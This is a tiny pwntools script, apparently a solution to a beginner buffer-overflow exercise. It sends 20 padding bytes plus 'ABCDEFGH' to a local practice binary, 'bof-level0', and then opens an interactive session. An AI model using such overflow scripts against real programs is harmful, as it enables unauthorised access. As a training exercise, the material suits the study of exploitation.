#!/usr/bin/env python

from pwn import *;

p = process('./bof-level0');

output = p.recv();
print(output)

p.sendline('0' * 20 + 'ABCDEFGH');

p.interactive()
